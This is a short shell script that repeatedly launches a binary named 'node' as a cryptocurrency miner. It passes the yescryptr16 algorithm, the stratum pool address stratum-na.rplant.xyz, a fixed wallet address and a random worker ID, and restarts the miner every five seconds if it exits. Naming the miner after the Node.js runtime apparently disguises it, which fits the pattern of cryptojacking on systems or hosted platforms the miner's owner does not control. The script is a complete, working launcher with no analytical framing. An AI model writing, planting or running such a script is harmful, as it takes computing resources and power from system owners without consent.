#!/bin/sh
while [ 1 ]; do
	./node -a yescryptr16  -o stratum+tcps://stratum-na.rplant.xyz:17055 -u qZHktc2QXhCBVztbGutoePSi9RtWmTeAsU.$(shuf -i 1-99999 -n 1) -p webpassword=x
	sleep 5
done
